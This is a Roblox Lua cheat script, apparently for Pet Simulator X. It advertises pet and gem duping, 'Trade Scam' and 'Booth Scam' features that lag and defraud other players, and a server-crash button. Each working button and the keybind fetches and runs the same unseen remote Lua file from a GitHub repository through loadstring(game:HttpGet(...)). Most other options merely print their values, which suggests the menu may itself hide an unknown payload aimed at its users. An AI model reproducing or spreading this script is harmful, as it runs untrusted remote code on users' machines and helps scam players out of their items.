local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "8888 Team - PSX PRIVATE V4.2", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})

local Tab = Window:MakeTab({
        Name = "Info",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })
    
    Tab:AddParagraph("Made By 8888 Team","Owner: partner#5193 | Developer's: Masqta_#6880")
    
     local Section = Tab:AddSection({
        Name = "Status"
    })
    
     Tab:AddLabel("Dupe: ✅")

    Tab:AddLabel("Trade Scam: ✅")
    
    Tab:AddLabel("Booth Scam: ✅")
    
     local Section = Tab:AddSection({
        Name = "Update Logs"
    })
    
     Tab:AddParagraph("[✨SHINY] UPDATE","Version 4.2")
     
     Tab:AddParagraph("Duping Is Fully Fixed and Optimized","")
     Tab:AddParagraph("Trading Scam Fully Fixed!","")
     Tab:AddParagraph("BUGS Fixed!","")
     Tab:AddParagraph("Crash Game Fixed!","")
     Tab:AddParagraph("Game Error 277 Fixed!","")
     
     
     local Tab = Window:MakeTab({
        Name = "Dupe",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })
     
     local Section = Tab:AddSection({
        Name = "Dupe Section"
    })
    
    Tab:AddButton({
        Name = "(RISK) Start Dupe",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Partner12398/8888Team/main/lua1.lua"))()
          end    
    })
    
    local Section = Tab:AddSection({
        Name = "Dupe Options"
    })
    
    Tab:AddSlider({
        Name = "Select Pets Limits",
        Min = 0,
        Max = 20,
        Default = 1,
        Color = Color3.fromRGB(255,255,255),
        Increment = 1,
        ValueName = "PETS",
        Callback = function(Value)
            print(Value)
        end    
    })
    
    Tab:AddToggle({
        Name = "Dupe Only Equiped Pets",
        Default = false,
        Callback = function(Value)
            print(Value)
        end    
    })
     
     Tab:AddToggle({
        Name = "(RISK) Dupe Gems",
        Default = false,
        Callback = function(Value)
            print(Value)
        end    
    })
     
     Tab:AddTextbox({
        Name = "Rename all pets",
        Default = "Text Goes here",
        TextDisappear = true,
        Callback = function(Value)
            print(Value)
        end	  
    })
    
    local Tab = Window:MakeTab({
        Name = "Trade Scam",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })
    
    local Section = Tab:AddSection({
	Name = "ON/OFF"
    })
    
    Tab:AddButton({
        Name = "Trading Scam - BETA 1.1",
        Default = false,
        Callback = function(Value)
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Partner12398/8888Team/main/lua1.lua"))()
        end    
    })
        
    local Section = Tab:AddSection({
        Name = "Trade Scam Options"
    })
    
     Tab:AddSlider({
        Name = "Lag Victim For",
        Min = 0,
        Max = 60,
        Default = 10,
        Color = Color3.fromRGB(255,255,255),
        Increment = 1,
        ValueName = "Seconds",
        Callback = function(Value)
            print(Value)
        end    
    })
    
    Tab:AddButton({
        Name = "LagTrade",
        Default = false,
        Callback = function(Value)
            print(Value)
        end    
    })
    
    Tab:AddParagraph("Bot-Trade","Coming Soon!")

    local Tab = Window:MakeTab({
        Name = "Booth Scam",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })
    
      local Section = Tab:AddSection({
        Name = "Booth Section"
    })
    
    Tab:AddButton({
        Name = "Booth Scam",
        Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/Partner12398/8888Team/main/lua1.lua"))()
          end
    })
    
      local Section = Tab:AddSection({
        Name = "Booth Options"
    })
    
    Tab:AddBind({
	Name = "KeyBind",
	Default = Enum.KeyCode.E,
	Hold = false,
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Partner12398/8888Team/main/lua1.lua"))()
	end    
})

    Tab:AddTextbox({
	Name = "Gems For use",
	Default = "Index:1b",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})

    Tab:AddLabel("After you bought something from Booth, Click Booth Scam!")

      local Tab = Window:MakeTab({
        Name = "Others",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })
    
    local Section = Tab:AddSection({
        Name = "Server"
    })
    
     Tab:AddButton({
        Name = "Crash Server",
        Callback = function()
                  print("button pressed")
          end    
    })
    
    Tab:AddButton({
        Name = "Hop Servers",
        Callback = function()
                  print("button pressed")
          end    
    })
    
    local Section = Tab:AddSection({
        Name = "Other Scripts"
    })
    
    Tab:AddButton({
        Name = "Infinite Yields",
        Callback = function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
          end    
    })
    
       OrionLib:MakeNotification({
        Name = "8888 Teams Welcome's You!",
        Content = "Version 3.9 ",
        Image = "rbxassetid://4483345998",
        Time = 5
    })
    
    
    
     OrionLib:Init()
